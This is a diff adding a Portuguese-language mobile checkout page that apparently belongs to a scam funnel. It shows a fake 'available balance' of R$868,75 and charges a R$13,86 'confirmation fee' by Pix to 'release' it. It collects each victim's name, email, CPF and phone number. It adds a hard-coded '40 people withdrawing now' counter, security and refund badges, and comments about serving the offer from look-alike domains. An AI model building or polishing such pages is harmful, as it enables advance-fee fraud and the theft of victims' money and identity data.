@@ -1,0 +1,941 @@
+<!doctype html>
+<html lang="pt-BR">
+  <head>
+<script src="/params.js"></script>
+<script src="/api/tt.js"></script>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+    <meta name="robots" content="noindex, nofollow" />
+    <title>Checkout Seguro</title>
+
+    <style>
+      /* ==========================================================================
+         CONFIG VISUAL — mexa aqui para mudar cores, fonte e cantos
+         ========================================================================== */
+      :root {
+        --vermelho: #f5334f;        /* barra do topo e botao de pagar */
+        --vermelho-escuro: #d81f39;
+
+        --texto: #1a1f2b;
+        --texto-fraco: #6b7280;
+        --texto-apagado: #9ca3af;
+        --rotulo: #46617e;          /* rotulos dos campos */
+
+        --fundo: #f2f4f7;
+        --card: #ffffff;
+        --escuro: #1c1c1e;          /* capa do saldo */
+        --linha: #e5e7eb;
+
+        --verde: #16a34a;
+        --verde-escuro: #15803d;
+
+        --erro: #dc2626;
+        --erro-fundo: #fef2f2;
+
+        --raio: 12px;
+        --fonte: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      }
+
+      *,
+      *::before,
+      *::after {
+        box-sizing: border-box;
+      }
+
+      html {
+        -webkit-text-size-adjust: 100%;
+      }
+
+      body {
+        margin: 0;
+        background: var(--fundo);
+        color: var(--texto);
+        font-family: var(--fonte);
+        font-size: 15px;
+        line-height: 1.45;
+        -webkit-font-smoothing: antialiased;
+      }
+
+      img {
+        max-width: 100%;
+        display: block;
+      }
+
+      button,
+      input {
+        font: inherit;
+        color: inherit;
+      }
+
+      /* Vale para todo elemento com [hidden], mesmo os que tem display proprio. */
+      [hidden] {
+        display: none !important;
+      }
+
+      /* Layout mobile: tudo dentro de uma coluna estreita, centralizada mesmo
+         quando aberto no desktop. */
+      .app {
+        max-width: 480px;
+        margin: 0 auto;
+        background: var(--fundo);
+        min-height: 100vh;
+        padding-bottom: 28px;
+      }
+
+      /* ==========================================================================
+         HEADER
+         ========================================================================== */
+      .topo {
+        background: var(--vermelho);
+        color: #fff;
+        text-align: center;
+        padding: 14px 16px;
+        font-size: 15px;
+        font-weight: 700;
+        letter-spacing: 0.2px;
+      }
+
+      /* ==========================================================================
+         CAPA — bloco de saldo
+         ========================================================================== */
+      .capa {
+        background: var(--escuro);
+        border-radius: var(--raio);
+        padding: 18px 16px 16px;
+      }
+
+      .capa-rotulo {
+        margin: 0;
+        font-size: 11px;
+        font-weight: 600;
+        letter-spacing: 1.4px;
+        text-transform: uppercase;
+        color: #8e8e93;
+      }
+
+      .capa-valor {
+        margin: 6px 0 0;
+        font-size: 38px;
+        font-weight: 800;
+        line-height: 1.05;
+        letter-spacing: -0.5px;
+        color: #fff;
+      }
+
+      .capa-aviso {
+        margin: 10px 0 0;
+        font-size: 13px;
+        font-weight: 700;
+        color: var(--vermelho);
+        display: flex;
+        align-items: center;
+        gap: 6px;
+      }
+
+      /* ==========================================================================
+         CARDS / SECOES
+         ========================================================================== */
+      .conteudo {
+        padding: 12px;
+        display: grid;
+        gap: 12px;
+      }
+
+      .card {
+        background: var(--card);
+        border: 1px solid var(--linha);
+        border-radius: var(--raio);
+        padding: 14px;
+      }
+
+      .secao-titulo {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin: 0 0 14px;
+        font-size: 17px;
+        font-weight: 700;
+      }
+
+      .icone-secao {
+        width: 34px;
+        height: 34px;
+        flex: none;
+        border-radius: 50%;
+        background: var(--vermelho);
+        color: #fff;
+        display: grid;
+        place-items: center;
+      }
+
+      /* ==========================================================================
+         CARD DE CONFIRMACAO (produto + total)
+         ========================================================================== */
+      .conf-rotulo {
+        margin: 0 0 10px;
+        font-size: 12px;
+        color: var(--texto-apagado);
+      }
+
+      .conf-item {
+        display: flex;
+        gap: 12px;
+        align-items: center;
+      }
+
+      .conf-logo {
+        width: 48px;
+        height: 48px;
+        flex: none;
+        border-radius: 12px;
+        background: #fff;
+        border: 1px solid var(--linha);
+        display: grid;
+        place-items: center;
+        overflow: hidden;
+      }
+
+      .conf-logo img {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+      }
+
+      .conf-nome {
+        margin: 0;
+        font-size: 15px;
+        font-weight: 700;
+      }
+
+      .conf-valor {
+        margin: 2px 0 0;
+        font-size: 15px;
+        font-weight: 700;
+        color: var(--verde);
+      }
+
+      .conf-total {
+        display: flex;
+        justify-content: space-between;
+        align-items: baseline;
+        margin-top: 12px;
+        padding-top: 12px;
+        border-top: 1px solid var(--linha);
+        font-size: 15px;
+        font-weight: 700;
+      }
+
+      .conf-selo {
+        margin: 12px 0 0;
+        padding: 10px 12px;
+        border-radius: 8px;
+        background: #eafaf1;
+        border: 1px solid #bfe9d2;
+        text-align: center;
+        font-size: 13px;
+        color: var(--verde-escuro);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 6px;
+      }
+
+      .conf-selo b {
+        color: var(--verde);
+      }
+
+      /* ==========================================================================
+         CAMPO
+         ========================================================================== */
+      .campo > label {
+        display: block;
+        margin-bottom: 6px;
+        font-size: 13px;
+        font-weight: 500;
+        color: var(--rotulo);
+      }
+
+      .campo input {
+        width: 100%;
+        height: 48px;
+        padding: 0 12px;
+        background: #fff;
+        border: 1px solid var(--linha);
+        border-radius: 10px;
+        font-size: 16px; /* 16px evita o zoom automatico do iOS ao focar */
+        outline: none;
+      }
+
+      .campo input:focus {
+        border-color: var(--texto);
+        box-shadow: 0 0 0 3px rgba(26, 31, 43, 0.08);
+      }
+
+      .campo input::placeholder {
+        color: var(--texto-apagado);
+      }
+
+      .campo.erro input {
+        border-color: var(--erro);
+        background: var(--erro-fundo);
+      }
+
+      .msg-erro {
+        display: none;
+        margin: 5px 0 0;
+        font-size: 12.5px;
+        color: var(--erro);
+      }
+
+      .campo.erro .msg-erro {
+        display: block;
+      }
+
+      /* ==========================================================================
+         AVISO "PESSOAS AGORA"
+         ========================================================================== */
+      .agora {
+        display: flex;
+        align-items: center;
+        gap: 9px;
+        background: var(--card);
+        border-radius: var(--raio);
+        box-shadow: 0 1px 3px rgba(16, 24, 40, 0.09);
+        padding: 12px 14px;
+        font-size: 13px;
+        color: var(--texto-fraco);
+      }
+
+      .agora b {
+        color: var(--texto);
+      }
+
+      .agora-ponto {
+        width: 8px;
+        height: 8px;
+        flex: none;
+        border-radius: 50%;
+        background: var(--vermelho);
+        animation: piscar 1.5s ease-in-out infinite;
+      }
+
+      @keyframes piscar {
+        0%,
+        100% {
+          opacity: 1;
+          box-shadow: 0 0 0 0 rgba(245, 51, 79, 0.45);
+        }
+        50% {
+          opacity: 0.35;
+          box-shadow: 0 0 0 5px rgba(245, 51, 79, 0);
+        }
+      }
+
+      /* Respeita quem desligou animacoes no sistema. */
+      @media (prefers-reduced-motion: reduce) {
+        .agora-ponto {
+          animation: none;
+        }
+      }
+
+      /* ==========================================================================
+         BOTAO DE PAGAR
+         ========================================================================== */
+      .botao {
+        width: 100%;
+        min-height: 56px;
+        border: 0;
+        border-radius: 10px;
+        background: var(--vermelho);
+        color: #fff;
+        font-size: 18px;
+        font-weight: 800;
+        letter-spacing: 0.5px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        cursor: pointer;
+      }
+
+      .botao:active {
+        background: var(--vermelho-escuro);
+      }
+
+      .botao[disabled] {
+        opacity: 0.75;
+        cursor: progress;
+      }
+
+      .sob-botao {
+        margin: 12px 0 0;
+        text-align: center;
+        font-size: 13px;
+        color: var(--texto-fraco);
+      }
+
+      .sob-botao b {
+        color: var(--texto);
+      }
+
+      /* ==========================================================================
+         SELOS DE SEGURANCA
+         ========================================================================== */
+      .selos {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        padding: 16px 4px;
+      }
+
+      .selo {
+        text-align: center;
+        padding: 0 6px;
+      }
+
+      .selo + .selo {
+        border-left: 1px solid var(--linha);
+      }
+
+      .selo-icone {
+        width: 40px;
+        height: 40px;
+        margin: 0 auto 8px;
+        border-radius: 11px;
+        display: grid;
+        place-items: center;
+      }
+
+      .selo-icone.verde {
+        background: #e7f8ef;
+        color: #16a34a;
+      }
+
+      .selo-icone.azul {
+        background: #e7ecfd;
+        color: #4c6ef5;
+      }
+
+      .selo-icone.ambar {
+        background: #fff3dc;
+        color: #e8a219;
+      }
+
+      .selo p {
+        margin: 0;
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 1.3;
+        color: #33415c;
+      }
+
+      /* ==========================================================================
+         RODAPE
+         ========================================================================== */
+      .rodape {
+        margin: 0;
+        padding: 0 16px;
+        text-align: center;
+        font-size: 12.5px;
+        color: var(--texto-apagado);
+        line-height: 1.6;
+      }
+
+      /* Estado de sucesso (provisorio, ate ligar o gateway) */
+      .sucesso {
+        text-align: center;
+        padding: 26px 16px;
+      }
+
+      .sucesso-selo {
+        width: 60px;
+        height: 60px;
+        margin: 0 auto 12px;
+        border-radius: 50%;
+        background: #e7f8ef;
+        color: #16a34a;
+        display: grid;
+        place-items: center;
+        font-size: 28px;
+        font-weight: 800;
+      }
+
+      .qr-espaco {
+        width: 190px;
+        height: 190px;
+        margin: 16px auto 0;
+        border: 2px dashed var(--linha);
+        border-radius: 12px;
+        display: grid;
+        place-items: center;
+        font-size: 12px;
+        color: var(--texto-apagado);
+        text-align: center;
+        padding: 12px;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="app">
+      <!-- ================= HEADER ================= -->
+      <header class="topo">Pagamento Seguro e Rápido</header>
+
+      <div class="conteudo" id="conteudo">
+        <!-- ================= CAPA (SALDO) ================= -->
+        <section class="capa">
+          <p class="capa-rotulo" id="capa-rotulo">Seu saldo disponível</p>
+          <p class="capa-valor" id="capa-valor">R$868,75</p>
+          <p class="capa-aviso">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <path d="M4.5 12.5l5 5L19.5 6.5" />
+            </svg>
+            <span id="capa-aviso-texto">Saldo selecionado para saque</span>
+          </p>
+        </section>
+
+        <!-- ================= CONFIRMACAO (produto + total) ================= -->
+        <section class="card">
+          <p class="conf-rotulo">Confirmação:</p>
+
+          <div class="conf-item">
+            <div class="conf-logo" id="conf-logo">
+              <!-- Logo provisoria: troque OFERTA.logo pelo caminho da sua imagem -->
+              <svg width="34" height="34" viewBox="0 0 24 24" aria-hidden="true">
+                <path
+                  d="M12 3.6c-.62 0-1.19.33-1.5.87L2.6 18.1a1.73 1.73 0 0 0 1.5 2.6h15.8a1.73 1.73 0 0 0 1.5-2.6L13.5 4.47A1.73 1.73 0 0 0 12 3.6z"
+                  fill="#f2e529"
+                  stroke="#1c1c1e"
+                  stroke-width="1.6"
+                  stroke-linejoin="round"
+                />
+                <path d="M12 9v4.6" stroke="#1c1c1e" stroke-width="2.4" stroke-linecap="round" />
+                <circle cx="12" cy="17.1" r="1.2" fill="#1c1c1e" />
+              </svg>
+            </div>
+
+            <div>
+              <h1 class="conf-nome" id="conf-nome">Taxa de Confirmação</h1>
+              <p class="conf-valor" id="conf-valor">R$ 13,86</p>
+            </div>
+          </div>
+
+          <div class="conf-total">
+            <span>Total:</span>
+            <span id="conf-total-valor">R$ 13,86</span>
+          </div>
+
+          <p class="conf-selo">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <path d="M4.5 12.5l5 5L19.5 6.5" />
+            </svg>
+            <span>Pague e libere seus <b id="conf-saldo">R$868,75</b> imediatamente</span>
+          </p>
+        </section>
+
+        <form id="form-checkout" novalidate>
+          <div style="display: grid; gap: 12px">
+            <!-- ================= IDENTIFICACAO ================= -->
+            <section class="card">
+              <h2 class="secao-titulo">
+                <span class="icone-secao">
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                    <circle cx="12" cy="8" r="3.4" />
+                    <path d="M5.5 19.5c1.2-3.2 3.7-4.8 6.5-4.8s5.3 1.6 6.5 4.8" />
+                  </svg>
+                </span>
+                Identifique-se
+              </h2>
+
+              <div class="campo" data-campo="email">
+                <label for="email">Email</label>
+                <input id="email" name="email" type="email" inputmode="email" autocomplete="email" placeholder="Email" />
+                <p class="msg-erro"></p>
+              </div>
+
+              <div class="campo" data-campo="nome">
+                <label for="nome">Nome completo</label>
+                <input id="nome" name="nome" type="text" autocomplete="name" placeholder="Seu nome completo" />
+                <p class="msg-erro"></p>
+              </div>
+
+              <div class="campo" data-campo="cpf">
+                <label for="cpf">CPF</label>
+                <input id="cpf" name="cpf" type="text" inputmode="numeric" autocomplete="off" maxlength="14" placeholder="000.000.000-00" />
+                <p class="msg-erro"></p>
+              </div>
+
+              <div class="campo" data-campo="telefone">
+                <label for="telefone">Celular</label>
+                <input id="telefone" name="telefone" type="tel" inputmode="tel" autocomplete="tel-national" maxlength="15" placeholder="(11) 99999-9999" />
+                <p class="msg-erro"></p>
+              </div>
+            </section>
+
+            <!-- ================= PESSOAS AGORA ================= -->
+            <section class="agora">
+              <span class="agora-ponto" aria-hidden="true"></span>
+              <span><b id="agora-numero">40</b> <span id="agora-texto">pessoas resgatando agora</span></span>
+            </section>
+
+            <!-- ================= PAGAMENTO ================= -->
+            <section class="card">
+              <h2 class="secao-titulo">
+                <span class="icone-secao">
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                    <rect x="2.8" y="5.5" width="18.4" height="13" rx="2.5" />
+                    <path d="M2.8 10h18.4" />
+                  </svg>
+                </span>
+                Pagamento
+              </h2>
+
+              <button type="submit" class="botao" id="botao-pagar">
+                <span id="botao-texto">PAGAR AGORA</span>
+              </button>
+
+              <p class="sob-botao">
+                Pagamento seguro via <b>PIX</b> com aprovação imediata.
+              </p>
+            </section>
+
+            <!-- ================= SELOS ================= -->
+            <section class="card selos">
+              <div class="selo">
+                <span class="selo-icone verde">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                    <path d="M12 3l7 3v5.2c0 4.4-2.9 8.2-7 9.8-4.1-1.6-7-5.4-7-9.8V6z" />
+                  </svg>
+                </span>
+                <p>Compra<br />Segura</p>
+              </div>
+
+              <div class="selo">
+                <span class="selo-icone azul">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                    <rect x="4.5" y="10.5" width="15" height="9.5" rx="2.2" />
+                    <path d="M8.2 10.5V7.6a3.8 3.8 0 0 1 7.6 0v2.9" />
+                  </svg>
+                </span>
+                <p>Dados<br />Protegidos</p>
+              </div>
+
+              <div class="selo">
+                <span class="selo-icone ambar">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                    <path d="M4 10.5L12 4l8 6.5" />
+                    <path d="M6 10v9.5h12V10" />
+                    <path d="M10.2 19.5v-5h3.6v5" />
+                  </svg>
+                </span>
+                <p>Reembolso<br />7 dias</p>
+              </div>
+            </section>
+          </div>
+        </form>
+
+        <p class="rodape">Compra 100% segura. Reembolso garantido em até 7 dias.</p>
+      </div>
+    </div>
+
+    <script src="/api-pix.js"></script>
+    <script>
+      /* ==========================================================================
+         CONFIG DA OFERTA — troque estes valores pela sua oferta real
+         ========================================================================== */
+      const OFERTA = {
+        // Capa do topo (bloco escuro do saldo)
+        capa: {
+          rotulo: "Seu saldo disponível",
+          valor: 868.75,
+          aviso: "Saldo selecionado para saque",
+        },
+
+        // Card de confirmação
+        nome: "Taxa de Confirmação",
+        preco: 13.86,   // valor cobrado no Pix
+
+        // Aviso abaixo da identificação
+        pessoasAgora: 40,
+        pessoasTexto: "pessoas sacando agora mesmo",
+
+        // Logo: basta salvar o arquivo como "logo.png" (ou .jpg / .svg / .webp)
+        // dentro da pasta "imagens". O checkout acha sozinho, sem editar nada aqui.
+        // Se quiser usar outro nome, escreva o caminho completo:
+        // logo: "imagens/meu-arquivo.png"
+        logo: "",
+      };
+
+      /* ========================================================================== */
+
+      const $ = (sel) => document.querySelector(sel);
+      const emReais = (v) =>
+        v.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
+      const primeiroNome = (v) => v.trim().split(/\s+/)[0] || "";
+
+      const form = $("#form-checkout");
+
+      /* ---------- Validação ---------- */
+
+      function validarNome() {
+        const input = $("#nome");
+        const caixa = document.querySelector('[data-campo="nome"]');
+        const valor = input.value.trim();
+
+        let msg = "";
+        if (!valor) msg = "Informe seu nome completo";
+        else if (valor.split(/\s+/).length < 2) msg = "Informe nome e sobrenome";
+
+        caixa.classList.toggle("erro", Boolean(msg));
+        caixa.querySelector(".msg-erro").textContent = msg;
+        return !msg;
+      }
+
+      $("#nome").addEventListener("blur", validarNome);
+      // Depois do primeiro erro, corrige em tempo real enquanto digita.
+      $("#nome").addEventListener("input", () => {
+        if (document.querySelector('[data-campo="nome"]').classList.contains("erro")) {
+          validarNome();
+        }
+      });
+
+      function validarEmail() {
+        const caixa = document.querySelector('[data-campo="email"]');
+        const valor = $("#email").value.trim();
+        let msg = "";
+        if (!valor) msg = "Informe seu e-mail";
+        else if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(valor)) msg = "E-mail inválido";
+        caixa.classList.toggle("erro", Boolean(msg));
+        caixa.querySelector(".msg-erro").textContent = msg;
+        return !msg;
+      }
+
+      $("#email").addEventListener("blur", validarEmail);
+      $("#email").addEventListener("input", () => {
+        if (document.querySelector('[data-campo="email"]').classList.contains("erro")) {
+          validarEmail();
+        }
+      });
+
+      /* ---------- Envio ---------- */
+
+      /* ==========================================================================
+         PAGAMENTO (Paradise) — troque a URL pela do seu deploy do paradise-api
+         ========================================================================== */
+      const PIX = {
+        // Endpoint local; o gateway e autenticado pelo backend.
+        api: "/api/pix?f=front",
+        // Para onde levar o cliente depois que o Pix for aprovado.
+        // Deixe "" para apenas mostrar a tela de "pagamento aprovado".
+        proximo: "../up1/index.html",
+        // Caminho do produto dentro do funil. O dominio NAO fica fixo aqui: ele e
+        // pego do dominio em que o lead esta (tktkk-ofc-oferta, veora-app,
+        // miora-online...), porque todos servem a mesma oferta.
+        caminho: "/front/checkout-paradise.html",
+        // So entra se a pagina abrir fora do funil (arquivo local, teste).
+        dominioReserva: "https://COLOQUE-AQUI-O-SEU-DOMINIO",
+        // Produto cadastrado na Paradise (o mesmo que o checkout antigo
+        // informava). Vazio = a venda entra solta, sem produto.
+        produto: "",
+      };
+
+      // Monta o link do produto: dominio onde o lead esta + caminho do produto.
+      function linkDoProduto() {
+        const fora =
+          (location.protocol !== "http:" && location.protocol !== "https:") ||
+          /^(localhost|127\.0\.0\.1)$/.test(location.hostname);
+        return (fora ? PIX.dominioReserva : location.origin) + PIX.caminho;
+      }
+
+      /* ---------- CPF e celular (exigidos pelo gateway) ---------- */
+
+      function marcarCampo(campo, mensagem) {
+        const caixa = document.querySelector('[data-campo="' + campo + '"]');
+        if (!caixa) return !mensagem;
+        caixa.classList.toggle("erro", Boolean(mensagem));
+        const aviso = caixa.querySelector(".msg-erro");
+        if (aviso) aviso.textContent = mensagem;
+        return !mensagem;
+      }
+
+      function validarCpf() {
+        const valor = $("#cpf").value;
+        let msg = "";
+        if (!PIXBRIDGE.soDigitos(valor)) msg = "Informe seu CPF";
+        else if (!PIXBRIDGE.cpfValido(valor)) msg = "CPF inválido";
+        return marcarCampo("cpf", msg);
+      }
+
+      function validarTelefone() {
+        const valor = $("#telefone").value;
+        let msg = "";
+        if (!PIXBRIDGE.soDigitos(valor)) msg = "Informe seu celular";
+        else if (!PIXBRIDGE.telefoneValido(valor)) msg = "Celular inválido (DDD + número)";
+        return marcarCampo("telefone", msg);
+      }
+
+      PIXBRIDGE.ligarCampo("#cpf", PIXBRIDGE.mascararCpf);
+      PIXBRIDGE.ligarCampo("#telefone", PIXBRIDGE.mascararTelefone);
+      $("#cpf").addEventListener("blur", validarCpf);
+      $("#telefone").addEventListener("blur", validarTelefone);
+
+      form.addEventListener("submit", (e) => {
+        e.preventDefault();
+
+        const emailOk = validarEmail();
+        const nomeOk = validarNome();
+
+const cpfOk = validarCpf();
+        const telefoneOk = validarTelefone();
+
+        if (!emailOk || !nomeOk || !cpfOk || !telefoneOk) {
+          const input = !emailOk ? $("#email") : !nomeOk ? $("#nome") : !cpfOk ? $("#cpf") : $("#telefone");
+          input.scrollIntoView({ behavior: "smooth", block: "center" });
+          input.focus({ preventScroll: true });
+          return;
+        }
+
+        const nome = $("#nome").value.trim();
+        const email = $("#email").value.trim();
+
+        const botao = $("#botao-pagar");
+        botao.disabled = true;
+        $("#botao-texto").textContent = "GERANDO PIX...";
+
+        function restaurarBotao() {
+          botao.disabled = false;
+          $("#botao-texto").textContent = "PAGAR AGORA";
+        }
+
+        function mostrarPix(dados) {
+          const img = dados.qr_code_base64
+            ? '<img src="' + dados.qr_code_base64 + '" alt="QR Code Pix" style="width:220px;height:220px;margin:8px auto 0;display:block" />'
+            : "";
+          $("#conteudo").innerHTML =
+            '<section class="card sucesso">' +
+            '<div class="sucesso-selo">✓</div>' +
+            '<h2 style="margin:0 0 6px;font-size:18px">Pix gerado, ' +
+            primeiroNome(nome) +
+            "!</h2>" +
+            '<p style="margin:0 0 4px;color:var(--texto-fraco);font-size:14px">' +
+            "Valor: <b>" +
+            emReais(OFERTA.preco) +
+            "</b><br />Escaneie o QR Code ou copie o codigo abaixo." +
+            "</p>" +
+            img +
+            '<textarea id="pix-copia" readonly style="width:100%;margin-top:12px;padding:10px;border:1px solid var(--linha);border-radius:var(--raio);font-size:13px;resize:none;height:70px">' +
+            dados.qr_code +
+            "</textarea>" +
+            '<button type="button" id="pix-copiar" class="botao" style="margin-top:12px">COPIAR CODIGO PIX</button>' +
+            '<p id="pix-aviso" style="margin:12px 0 0;color:var(--texto-fraco);font-size:13px">Aguardando pagamento...</p>' +
+            "</section>";
+          window.scrollTo({ top: 0, behavior: "smooth" });
+          const btn = $("#pix-copiar");
+          btn.addEventListener("click", () => {
+            const campo = $("#pix-copia");
+            campo.focus();
+            campo.select();
+            if (navigator.clipboard) navigator.clipboard.writeText(dados.qr_code);
+            btn.textContent = "CODIGO COPIADO ✓";
+            setTimeout(() => {
+              btn.textContent = "COPIAR CODIGO PIX";
+            }, 2000);
+          });
+        }
+
+        function aguardarPagamento(txId) {
+          if (!txId) return;
+          const inicio = Date.now();
+          const timer = setInterval(async () => {
+            if (Date.now() - inicio > 15 * 60 * 1000) {
+              clearInterval(timer);
+              const aviso = $('#pix-aviso');
+              if (aviso) aviso.textContent = 'Tempo de pagamento expirado. Gere um novo Pix.';
+              return;
+            }
+            try {
+              const r = await PIXBRIDGE.status(PIX.api, txId);
+              const d = await r.json();
+              if (d && d.expirado) { clearInterval(timer); return; }
+              if (d && d.pago) {
+                clearInterval(timer);
+                if (PIX.proximo) {
+                  window.location.href = PIX.proximo + (location.search || "");
+                } else {
+                  const aviso = $("#pix-aviso");
+                  if (aviso) {
+                    aviso.textContent = "Pagamento aprovado! ✓";
+                    aviso.style.color = "var(--verde)";
+                  }
+                }
+              }
+            } catch (e) {
+              /* tenta de novo no proximo ciclo */
+            }
+          }, 5000);
+        }
+
+        (async () => {
+          try {
+const resp = await PIXBRIDGE.criar(PIX.api, {
+              preco: OFERTA.preco,
+              nome: nome,
+              email: email,
+              cpf: $("#cpf").value,
+              telefone: $("#telefone").value,
+              descricao: OFERTA.nome,
+            });
+            const dados = await resp.json();
+            if (!resp.ok || !dados.qr_code) {
+              throw new Error((dados && dados.erro) || "Falha ao gerar o Pix");
+            }
+            mostrarPix(dados);
+            aguardarPagamento(dados.transaction_id);
+          } catch (err) {
+            restaurarBotao();
+            alert("Nao deu para gerar o Pix agora. Tente de novo.\n\n" + (err && err.message ? err.message : err));
+          }
+        })();
+      });
+
+      /* ---------- Início ---------- */
+
+      $("#capa-rotulo").textContent = OFERTA.capa.rotulo;
+      // Na capa o valor vai colado ("R$868,75"), como no layout aprovado.
+      $("#capa-valor").textContent = emReais(OFERTA.capa.valor).replace(/\s/g, "");
+      $("#capa-aviso-texto").textContent = OFERTA.capa.aviso;
+
+      $("#conf-nome").textContent = OFERTA.nome;
+      $("#conf-valor").textContent = emReais(OFERTA.preco);
+      $("#conf-total-valor").textContent = emReais(OFERTA.preco);
+      $("#conf-saldo").textContent = emReais(OFERTA.capa.valor).replace(/\s/g, "");
+
+      $("#agora-numero").textContent = OFERTA.pessoasAgora;
+      $("#agora-texto").textContent = OFERTA.pessoasTexto;
+
+      /* ---------- Logo ----------
+         Procura o arquivo na pasta "imagens" e usa o primeiro que existir.
+         Se nao achar nenhum, fica o triangulo provisorio que ja esta no HTML. */
+      const CAMINHOS_LOGO = OFERTA.logo
+        ? [OFERTA.logo]
+        : [
+            "imagens/logo.png",
+            "imagens/logo.jpg",
+            "imagens/logo.jpeg",
+            "imagens/logo.svg",
+            "imagens/logo.webp",
+          ];
+
+      (function procurarLogo(i) {
+        if (i >= CAMINHOS_LOGO.length) return;
+
+        const teste = new Image();
+        teste.onload = () => {
+          $("#conf-logo").innerHTML =
+            '<img src="' + CAMINHOS_LOGO[i] + '" alt="' + OFERTA.nome + '" />';
+        };
+        teste.onerror = () => procurarLogo(i + 1);
+        teste.src = CAMINHOS_LOGO[i];
+      })(0);
+    </script>
+  </body>
+</html>
